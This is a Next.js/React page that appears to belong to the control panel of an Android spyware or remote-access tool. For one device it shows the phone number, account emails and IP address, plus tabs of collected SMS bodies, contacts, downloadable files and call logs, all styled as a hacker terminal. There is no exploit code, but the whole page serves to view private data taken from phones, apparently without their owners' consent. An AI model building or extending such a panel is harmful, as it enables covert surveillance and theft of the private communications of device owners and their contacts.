"use client";

import { useState } from "react";
import { useParams, useRouter } from "next/navigation";
import { useDevice, useDeleteDevice, useDeviceSms, useDeviceContacts, useDeviceFiles, useDeviceCallLogs } from "@/hooks/useDevices";
import { useAuthStore } from "@/store/authStore";
import { LoadingSpinner } from "@/components/shared/loading-spinner";
import { ErrorState } from "@/components/shared/error-state";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { formatDate } from "@/lib/utils";
import { FiArrowLeft, FiTrash2, FiSmartphone, FiHash, FiCpu, FiPackage, FiClock, FiCalendar, FiActivity, FiMessageSquare, FiUsers, FiFolder, FiMail, FiPhone, FiPhoneCall, FiGlobe, FiTerminal, FiDownload } from "react-icons/fi";
import { cn } from "@/lib/utils";

const API_BASE = process.env.NEXT_PUBLIC_API_URL || "http://localhost:5000/api";

type Tab = "info" | "sms" | "contacts" | "files" | "calllogs";

function formatDateTime(ts: number | string | null | undefined): string {
  if (ts === null || ts === undefined || ts === 0 || ts === "0") return "\u2014";
  const num = Number(ts);
  if (isNaN(num) || num <= 0) return "\u2014";
  const d = new Date(num);
  if (isNaN(d.getTime())) return "\u2014";
  return d.toLocaleString("en-US", { year: "numeric", month: "short", day: "numeric", hour: "2-digit", minute: "2-digit", second: "2-digit" });
}

function formatFileSize(bytes: number): string {
  if (!bytes || bytes <= 0) return "0 B";
  const units = ["B", "KB", "MB", "GB"];
  let i = 0; let size = bytes;
  while (size >= 1024 && i < units.length - 1) { size /= 1024; i++; }
  return `${size.toFixed(i === 0 ? 0 : 1)} ${units[i]}`;
}

function formatDuration(seconds: number): string {
  if (!seconds || seconds <= 0) return "0:00";
  const m = Math.floor(seconds / 60); const s = Math.floor(seconds % 60);
  return `${m}:${s.toString().padStart(2, "0")}`;
}

function CollectingState({ type }: { type: string }) {
  return (
    <div className="text-center py-12 space-y-3">
      <div className="flex justify-center">
        <div className="h-8 w-8 border-2 border-emerald-500/30 border-t-emerald-400 rounded-full animate-spin" />
      </div>
      <p className="text-xs font-mono text-emerald-500">Fetching {type} from device...</p>
      <p className="text-[10px] font-mono text-emerald-700/60">Data will appear automatically once collected</p>
    </div>
  );
}

export default function DeviceDetailPage() {
  const params = useParams();
  const router = useRouter();
  const id = params.id as string;
  const [tab, setTab] = useState<Tab>("info");
  const [selectedSms, setSelectedSms] = useState<any>(null);

  const { data, isLoading, error, refetch } = useDevice(id);
  const device = data?.device;
  const deviceId = device?.deviceId || "";
  const deviceReady = !!deviceId;
  const isRecentlyActive = device?.lastSeen ? Date.now() - new Date(device.lastSeen).getTime() < 10 * 60 * 1000 : true;

  const { data: smsData, isLoading: smsLoading } = useDeviceSms(deviceId);
  const { data: contactsData, isLoading: contactsLoading } = useDeviceContacts(deviceId);
  const { data: filesData, isLoading: filesLoading } = useDeviceFiles(deviceId);
  const { data: callLogsData, isLoading: callLogsLoading } = useDeviceCallLogs(deviceId);
  const role = useAuthStore((s) => s.role);
  const deleteMutation = useDeleteDevice();

  if (isLoading) {
    return (
      <div className="flex h-[50vh] items-center justify-center">
        <LoadingSpinner size="lg" />
      </div>
    );
  }

  if (error || !device) {
    return <ErrorState title="Device not found" message={error?.message || "The device you're looking for doesn't exist."} onRetry={() => refetch()} />;
  }

  const handleDelete = () => { deleteMutation.mutate(device.id, { onSuccess: () => router.push("/devices") }); };

  const tabs: { key: Tab; label: string; count?: number; loading: boolean }[] = [
    { key: "info", label: "INFO", loading: false },
    { key: "sms", label: "SMS", count: smsData?.sms?.length, loading: smsLoading },
    { key: "contacts", label: "CONTACTS", count: contactsData?.contacts?.length, loading: contactsLoading },
    { key: "files", label: "FILES", count: filesData?.files?.length, loading: filesLoading },
    { key: "calllogs", label: "CALL_LOGS", count: callLogsData?.callLogs?.length, loading: callLogsLoading },
  ];

  const infoItems = [
    { label: "device_name", value: device.deviceName, icon: FiSmartphone },
    { label: "device_id", value: device.deviceId, icon: FiHash },
    { label: "phone", value: device.phoneNumber || "\u2014", icon: FiPhone },
    { label: "email", value: device.accountEmails?.join(", ") || "\u2014", icon: FiMail },
    { label: "android", value: device.androidVersion || "\u2014", icon: FiCpu },
    { label: "app_version", value: device.appVersion || "\u2014", icon: FiPackage },
    { label: "ip", value: device.ipAddress || "\u2014", icon: FiGlobe },
    { label: "status", value: device.status === "online" ? "ONLINE" : "OFFLINE", icon: FiActivity, highlight: device.status === "online" },
    { label: "last_seen", value: formatDate(device.lastSeen), icon: FiClock },
    { label: "created", value: formatDate(device.createdAt), icon: FiCalendar },
  ];

  return (
    <div className="space-y-5 max-w-4xl animate-fade-in">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div className="flex items-center gap-3 min-w-0">
          <Button variant="ghost" size="icon" onClick={() => router.back()} className="shrink-0 text-emerald-600 hover:text-emerald-400 hover:bg-emerald-950/30">
            <FiArrowLeft className="h-4 w-4" />
          </Button>
          <div className="min-w-0">
            <div className="flex items-center gap-3">
              <h1 className="text-xl sm:text-2xl font-bold font-mono text-emerald-400 truncate">{device.deviceName}</h1>
              <div className={cn("flex items-center gap-1.5 px-2 py-0.5 rounded text-[10px] font-mono border shrink-0",
                device.status === "online"
                  ? "border-emerald-500/30 bg-emerald-950/30 text-emerald-400"
                  : "border-red-900/40 bg-red-950/20 text-red-500/60"
              )}>
                <span className={cn("h-1.5 w-1.5 rounded-full", device.status === "online" ? "bg-emerald-500 animate-pulse" : "bg-red-800")} />
                {device.status === "online" ? "LIVE" : "OFFLINE"}
              </div>
            </div>
            <p className="text-[10px] font-mono text-emerald-700 mt-0.5">Device details and collected data</p>
          </div>
        </div>
        {role === "admin" && (
          <Button variant="destructive" size="sm" onClick={handleDelete} disabled={deleteMutation.isPending}
            className="shrink-0 self-start sm:self-auto font-mono text-xs bg-red-950/30 border border-red-900/40 text-red-500 hover:bg-red-950/50">
            <FiTrash2 className="mr-1.5 h-3 w-3" />
            {deleteMutation.isPending ? "deleting..." : "delete_device"}
          </Button>
        )}
      </div>

      {/* Terminal-style Tab Navigation */}
      <div className="flex gap-0.5 border-b border-emerald-900/30 overflow-x-auto scrollbar-none">
        {tabs.map((t) => (
          <button key={t.key} onClick={() => setTab(t.key)}
            className={cn(
              "flex items-center gap-1.5 px-4 py-2.5 text-xs font-mono border-b-2 transition-all whitespace-nowrap shrink-0",
              tab === t.key
                ? "border-emerald-400 text-emerald-400 bg-emerald-500/5"
                : "border-transparent text-emerald-700 hover:text-emerald-500 hover:bg-emerald-500/5"
            )}
          >
            {t.label}
            {t.loading ? (
              <span className="h-3 w-6 shimmer rounded inline-block" />
            ) : t.count !== undefined ? (
              <span className="text-[10px] text-emerald-600/60 ml-1">[{t.count}]</span>
            ) : null}
          </button>
        ))}
      </div>

      {/* Info Tab */}
      {tab === "info" && (
        <div className="rounded-xl border border-emerald-900/30 bg-black/60 overflow-hidden box-glow-sm">
          <div className="px-5 py-3 border-b border-emerald-900/20 bg-emerald-950/20">
            <span className="text-xs font-mono text-emerald-400">// Device Information</span>
          </div>
          <div className="p-5">
            <div className="grid gap-4 sm:grid-cols-2">
              {infoItems.map((item) => (
                <div key={item.label} className="flex items-start gap-3 group">
                  <div className="flex h-9 w-9 items-center justify-center rounded-lg border border-emerald-900/30 bg-emerald-950/20 group-hover:bg-emerald-900/30 transition-colors shrink-0">
                    <item.icon className={cn("h-4 w-4", item.highlight ? "text-emerald-400" : "text-emerald-600")} />
                  </div>
                  <div className="min-w-0">
                    <p className="text-[10px] font-mono text-emerald-700 uppercase tracking-wider">{item.label}</p>
                    <p className={cn("text-sm font-mono mt-0.5 truncate", item.highlight ? "text-emerald-400" : "text-emerald-300")}>{item.value}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* SMS Tab */}
      {tab === "sms" && (
        <div className="rounded-xl border border-emerald-900/30 bg-black/60 overflow-hidden box-glow-sm">
          <div className="px-5 py-3 border-b border-emerald-900/20 bg-emerald-950/20">
            <span className="text-xs font-mono text-emerald-400">// SMS Messages {!smsLoading ? `[${smsData?.sms?.length || 0}]` : ""}</span>
          </div>
          <div className="p-5">
            {smsLoading ? (
              <div className="space-y-3">
                {[...Array(5)].map((_, i) => (
                  <div key={i} className="flex items-start gap-3 p-3 rounded-lg bg-emerald-950/10">
                    <div className="shimmer h-4 w-4 mt-1 shrink-0 rounded" />
                    <div className="flex-1 space-y-2">
                      <div className="shimmer h-4 w-32 rounded" />
                      <div className="shimmer h-3 w-full rounded" />
                      <div className="shimmer h-3 w-40 rounded" />
                    </div>
                  </div>
                ))}
              </div>
            ) : !smsData?.sms?.length ? (
              isRecentlyActive ? <CollectingState type="SMS" /> :
              <p className="text-xs font-mono text-emerald-700 text-center py-8">No SMS data collected</p>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {smsData.sms.map((msg: any, i: number) => (
                  <div key={msg.id || i} onClick={() => setSelectedSms(msg)}
                    className="flex items-start gap-3 p-3 rounded-lg bg-emerald-950/10 cursor-pointer hover:bg-emerald-950/30 transition-all duration-150 border border-transparent hover:border-emerald-900/30"
                  >
                    <div className="flex h-8 w-8 items-center justify-center rounded-lg border border-emerald-900/30 bg-emerald-950/30 shrink-0 mt-0.5">
                      <FiMessageSquare className="h-4 w-4 text-emerald-400" />
                    </div>
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <span className="text-sm font-mono text-emerald-300">{msg.address || "Unknown"}</span>
                        <span className={cn("text-[10px] font-mono px-1.5 py-0.5 rounded border",
                          msg.type === 1 ? "border-emerald-900/30 text-emerald-500" : "border-cyan-900/30 text-cyan-500"
                        )}>
                          {msg.type === 1 ? "IN" : "OUT"}
                        </span>
                      </div>
                      <p className="text-xs font-mono text-emerald-600 truncate mt-0.5">{msg.body || "(empty)"}</p>
                      <p className="text-[10px] font-mono text-emerald-700/60 mt-1">{formatDateTime(msg.date)}</p>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Contacts Tab */}
      {tab === "contacts" && (
        <div className="rounded-xl border border-emerald-900/30 bg-black/60 overflow-hidden box-glow-sm">
          <div className="px-5 py-3 border-b border-emerald-900/20 bg-emerald-950/20">
            <span className="text-xs font-mono text-emerald-400">// Contacts {!contactsLoading ? `[${contactsData?.contacts?.length || 0}]` : ""}</span>
          </div>
          <div className="p-5">
            {contactsLoading ? (
              <div className="space-y-3">
                {[...Array(5)].map((_, i) => (
                  <div key={i} className="flex items-start gap-3 p-3 rounded-lg bg-emerald-950/10">
                    <div className="shimmer h-8 w-8 rounded-full shrink-0" />
                    <div className="flex-1 space-y-2">
                      <div className="shimmer h-4 w-40 rounded" />
                      <div className="shimmer h-3 w-28 rounded" />
                      <div className="shimmer h-3 w-36 rounded" />
                    </div>
                  </div>
                ))}
              </div>
            ) : !contactsData?.contacts?.length ? (
              isRecentlyActive ? <CollectingState type="contacts" /> :
              <p className="text-xs font-mono text-emerald-700 text-center py-8">No contacts collected</p>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {contactsData.contacts.map((c: any, i: number) => (
                  <div key={c.id || i} className="flex items-start gap-3 p-3 rounded-lg bg-emerald-950/10 border border-transparent hover:border-emerald-900/30 transition-all duration-150">
                    <div className="flex h-10 w-10 items-center justify-center rounded-full border border-emerald-500/30 bg-emerald-950/40 shrink-0">
                      <span className="text-xs font-mono font-bold text-emerald-400">{(c.name || "?").charAt(0).toUpperCase()}</span>
                    </div>
                    <div className="min-w-0 flex-1">
                      <p className="text-sm font-mono text-emerald-300">{c.name || "Unknown"}</p>
                      {c.phone_number && (
                        <div className="flex items-center gap-1.5 text-xs font-mono text-emerald-500 mt-0.5">
                          <FiPhone className="h-3 w-3 shrink-0" />
                          <span>{c.phone_number}</span>
                        </div>
                      )}
                      {c.email && (
                        <div className="flex items-center gap-1.5 text-xs font-mono text-emerald-600 mt-0.5">
                          <FiMail className="h-3 w-3 shrink-0" />
                          <span>{c.email}</span>
                        </div>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Files Tab */}
      {tab === "files" && (
        <div className="rounded-xl border border-emerald-900/30 bg-black/60 overflow-hidden box-glow-sm">
          <div className="px-5 py-3 border-b border-emerald-900/20 bg-emerald-950/20">
            <span className="text-xs font-mono text-emerald-400">// Files {!filesLoading ? `[${filesData?.files?.length || 0}]` : ""}</span>
          </div>
          <div className="p-5">
            {filesLoading ? (
              <div className="space-y-3">
                {[...Array(5)].map((_, i) => (
                  <div key={i} className="flex items-start gap-3 p-3 rounded-lg bg-emerald-950/10">
                    <div className="shimmer h-4 w-4 mt-1 shrink-0" />
                    <div className="flex-1 space-y-2">
                      <div className="shimmer h-4 w-3/4 rounded" />
                      <div className="shimmer h-3 w-full rounded" />
                      <div className="shimmer h-3 w-20 rounded" />
                    </div>
                  </div>
                ))}
              </div>
            ) : !filesData?.files?.length ? (
              isRecentlyActive ? <CollectingState type="files" /> :
              <p className="text-xs font-mono text-emerald-700 text-center py-8">No files collected</p>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {filesData.files.map((f: any, i: number) => (
                  <div key={f.id || i} className="flex items-start gap-3 p-3 rounded-lg bg-emerald-950/10 border border-transparent hover:border-emerald-900/30 transition-all duration-150">
                    <div className="flex h-8 w-8 items-center justify-center rounded-lg border border-amber-900/30 bg-amber-950/30 shrink-0 mt-0.5">
                      <FiFolder className="h-4 w-4 text-amber-400" />
                    </div>
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <p className="text-sm font-mono text-emerald-300 truncate">{f.name}</p>
                        {f.id && (
                          <a href={`${API_BASE}/device/file-content/${f.id}`} download
                            className="inline-flex items-center gap-1 text-[10px] font-mono border border-emerald-900/30 text-emerald-500 hover:text-emerald-400 px-2 py-0.5 rounded shrink-0 hover:bg-emerald-950/30 transition-all"
                          >
                            <FiDownload className="h-3 w-3" /> DL
                          </a>
                        )}
                      </div>
                      <p className="text-[10px] font-mono text-emerald-700 truncate mt-0.5">{f.path || "\u2014"}</p>
                      <div className="flex gap-4 text-[10px] font-mono text-emerald-600 mt-1">
                        <span>{f.is_directory ? "[DIR]" : formatFileSize(f.size)}</span>
                        <span>{formatDateTime(f.last_modified)}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Call Logs Tab */}
      {tab === "calllogs" && (
        <div className="rounded-xl border border-emerald-900/30 bg-black/60 overflow-hidden box-glow-sm">
          <div className="px-5 py-3 border-b border-emerald-900/20 bg-emerald-950/20">
            <span className="text-xs font-mono text-emerald-400">// Call Logs {!callLogsLoading ? `[${callLogsData?.callLogs?.length || 0}]` : ""}</span>
          </div>
          <div className="p-5">
            {callLogsLoading ? (
              <div className="space-y-3">
                {[...Array(5)].map((_, i) => (
                  <div key={i} className="flex items-start gap-3 p-3 rounded-lg bg-emerald-950/10">
                    <div className="shimmer h-4 w-4 mt-1 shrink-0" />
                    <div className="flex-1 space-y-2">
                      <div className="shimmer h-4 w-32 rounded" />
                      <div className="shimmer h-3 w-24 rounded" />
                      <div className="shimmer h-3 w-40 rounded" />
                    </div>
                  </div>
                ))}
              </div>
            ) : !callLogsData?.callLogs?.length ? (
              isRecentlyActive ? <CollectingState type="call logs" /> :
              <p className="text-xs font-mono text-emerald-700 text-center py-8">No call logs collected</p>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {callLogsData.callLogs.map((c: any, i: number) => {
                  const callType = c.type === 2 ? "OUT" : c.type === 1 ? "IN" : "MISSED";
                  const typeColor = c.type === 2 ? "text-cyan-400 border-cyan-900/30" : c.type === 1 ? "text-emerald-400 border-emerald-900/30" : "text-red-400 border-red-900/30";
                  return (
                    <div key={c.id || i} className="flex items-start gap-3 p-3 rounded-lg bg-emerald-950/10 border border-transparent hover:border-emerald-900/30 transition-all duration-150">
                      <div className={cn("flex h-8 w-8 items-center justify-center rounded-lg border shrink-0 mt-0.5", typeColor)}>
                        <FiPhoneCall className="h-4 w-4" />
                      </div>
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center gap-2">
                          <span className="text-sm font-mono text-emerald-300">{c.name || c.number || "Unknown"}</span>
                          <span className={cn("text-[10px] font-mono px-1.5 py-0.5 rounded border", typeColor)}>
                            {callType}
                          </span>
                        </div>
                        {c.number && c.name && (
                          <p className="text-[10px] font-mono text-emerald-700 mt-0.5">{c.number}</p>
                        )}
                        <div className="flex gap-4 text-[10px] font-mono text-emerald-600 mt-1">
                          <span>{formatDateTime(c.date)}</span>
                          <span className="font-medium">{formatDuration(c.duration)}</span>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </div>
      )}

      {/* SMS Detail Dialog */}
      <Dialog open={!!selectedSms} onOpenChange={(open) => !open && setSelectedSms(null)}>
        <DialogContent className="sm:max-w-lg border-emerald-900/30 bg-black shadow-[0_0_30px_rgba(52,211,153,0.08)]">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 font-mono text-emerald-400">
              <div className="flex h-7 w-7 items-center justify-center rounded-lg border border-emerald-900/30 bg-emerald-950/30">
                <FiMessageSquare className="h-4 w-4 text-emerald-400" />
              </div>
              SMS Details
            </DialogTitle>
          </DialogHeader>
          {selectedSms && (
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-1">
                  <p className="text-[10px] font-mono text-emerald-700 uppercase tracking-wider">From / To</p>
                  <p className="text-sm font-mono text-emerald-300">{selectedSms.address || "Unknown"}</p>
                </div>
                <div className="space-y-1">
                  <p className="text-[10px] font-mono text-emerald-700 uppercase tracking-wider">Type</p>
                  <span className={cn("text-[10px] font-mono px-2 py-0.5 rounded border",
                    selectedSms.type === 1 ? "border-emerald-900/30 text-emerald-500" : "border-cyan-900/30 text-cyan-500"
                  )}>
                    {selectedSms.type === 1 ? "INBOX" : "SENT"}
                  </span>
                </div>
                <div className="col-span-2 space-y-1">
                  <p className="text-[10px] font-mono text-emerald-700 uppercase tracking-wider">Date</p>
                  <p className="text-sm font-mono text-emerald-400">{formatDateTime(selectedSms.date)}</p>
                </div>
              </div>
              <div className="border-t border-emerald-900/20 pt-4 space-y-2">
                <p className="text-[10px] font-mono text-emerald-700 uppercase tracking-wider">Message Body</p>
                <div className="rounded-lg border border-emerald-900/30 bg-black/80 p-4 max-h-[300px] overflow-y-auto">
                  <p className="text-sm font-mono text-emerald-300 whitespace-pre-wrap break-words leading-relaxed">{selectedSms.body || "(empty)"}</p>
                </div>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
